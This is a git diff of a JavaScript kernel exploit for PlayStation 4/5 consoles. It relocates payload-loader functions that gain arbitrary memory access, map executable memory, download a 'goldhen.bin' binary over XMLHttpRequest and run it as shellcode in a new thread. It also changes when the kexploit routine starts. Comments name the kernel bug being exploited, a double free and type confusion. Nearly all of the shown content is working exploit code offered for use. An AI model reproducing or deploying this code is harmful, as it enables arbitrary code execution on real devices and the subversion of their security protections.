@@ -100,64 +100,6 @@ const fw_config = (() => {
   throw new RangeError(`unsupported console/firmware: ps${is_ps4 ? "4" : "5"}, version: ${hex(version)}`);
 })();
 
-var nogc = [];
-function malloc(sz) {
-        var backing = new Uint8Array(0x10000 + sz);
-        nogc.push(backing);
-        var ptr = mem.readp(mem.addrof(backing).add(0x10));
-        ptr.backing = backing;
-        return ptr;
-    }
-
-function malloc32(sz) {
-        var backing = new Uint8Array(0x10000 + sz * 4);
-        nogc.push(backing);
-        var ptr = mem.readp(mem.addrof(backing).add(0x10));
-        ptr.backing = new Uint32Array(backing.buffer);
-        return ptr;
-    }
-    
-function array_from_address(addr, size) {
-   var og_array = new Uint32Array(0x1000);
-    var og_array_i = mem.addrof(og_array).add(0x10);
-    mem.write64(og_array_i, addr);
-    mem.write32(og_array_i.add(0x8), size);
-    mem.write32(og_array_i.add(0xC), 0x1);
-    nogc.push(og_array);
-    return og_array;
-}
-
-export function toogle_payload(PLfile) {
- var loader_addr = chain.sysp('mmap', 0, 0x1000, 7, 0x41000, -1, 0);
- var tmpStubArray = array_from_address(loader_addr, 1);
- tmpStubArray[0] = 0x00C3E7FF;
- var req = new XMLHttpRequest();
- req.responseType = "arraybuffer";
- req.open('GET',PLfile);
- req.send();
- req.onreadystatechange = function () {
-  if (req.readyState == 4) {
-   var PLD = req.response;
-   var payload_buffer = chain.sysp('mmap', 0, PLD.byteLength*4, 7, 0x1002, -1, 0);
-   var pl = array_from_address(payload_buffer, PLD.byteLength*4);
-   var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
-   var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
-   tmp.set(new Uint8Array(req.response), 0);
-   tmp.set(padding, req.response.byteLength);
-   var shellcode = new Uint32Array(tmp.buffer);
-   pl.set(shellcode,0);
-   var pthread = malloc(0x10);
-   call_nze('pthread_create', pthread, 0, loader_addr, payload_buffer);
-   }
- };
- localStorage.passcount = ++localStorage.passcount;window.passCounter.innerHTML=localStorage.passcount;
- EndTimer();
-}
-
-function Exploit_done(){
-    toogle_payload('goldhen.bin');
-}
-
 const pthread_offsets = fw_config.pthread_offsets;
 const off_kstr = fw_config.off_kstr;
 const off_cpuid_to_pcpu = fw_config.off_cpuid_to_pcpu;
@@ -1730,6 +1672,64 @@ function setup(block_fd) {
     return [block_id, groom_ids];
 }
 
+var nogc = [];
+function malloc(sz) {
+        var backing = new Uint8Array(0x10000 + sz);
+        nogc.push(backing);
+        var ptr = mem.readp(mem.addrof(backing).add(0x10));
+        ptr.backing = backing;
+        return ptr;
+    }
+
+function malloc32(sz) {
+        var backing = new Uint8Array(0x10000 + sz * 4);
+        nogc.push(backing);
+        var ptr = mem.readp(mem.addrof(backing).add(0x10));
+        ptr.backing = new Uint32Array(backing.buffer);
+        return ptr;
+    }
+    
+function array_from_address(addr, size) {
+   var og_array = new Uint32Array(0x1000);
+    var og_array_i = mem.addrof(og_array).add(0x10);
+    mem.write64(og_array_i, addr);
+    mem.write32(og_array_i.add(0x8), size);
+    mem.write32(og_array_i.add(0xC), 0x1);
+    nogc.push(og_array);
+    return og_array;
+}
+
+function toogle_payload(PLfile) {
+ var loader_addr = chain.sysp('mmap', 0, 0x1000, 7, 0x41000, -1, 0);
+ var tmpStubArray = array_from_address(loader_addr, 1);
+ tmpStubArray[0] = 0x00C3E7FF;
+ var req = new XMLHttpRequest();
+ req.responseType = "arraybuffer";
+ req.open('GET',PLfile);
+ req.send();
+ req.onreadystatechange = function () {
+  if (req.readyState == 4) {
+   var PLD = req.response;
+   var payload_buffer = chain.sysp('mmap', 0, PLD.byteLength*4, 7, 0x1002, -1, 0);
+   var pl = array_from_address(payload_buffer, PLD.byteLength*4);
+   var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
+   var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
+   tmp.set(new Uint8Array(req.response), 0);
+   tmp.set(padding, req.response.byteLength);
+   var shellcode = new Uint32Array(tmp.buffer);
+   pl.set(shellcode,0);
+   var pthread = malloc(0x10);
+   call_nze('pthread_create', pthread, 0, loader_addr, payload_buffer);
+   }
+ };
+ localStorage.passcount = ++localStorage.passcount;window.passCounter.innerHTML=localStorage.passcount;
+ EndTimer();
+}
+
+function Exploit_done(){
+    toogle_payload('goldhen.bin');
+}
+
 // overview:
 // * double free a aio_entry (resides at a 0x80 malloc zone)
 // * type confuse a evf and a ip6_rthdr
@@ -1834,4 +1834,4 @@ export async function kexploit() {
         close(sd);
     }
 }
-setTimeout(kexploit, 500);
+setTimeout(kexploit, 1500);
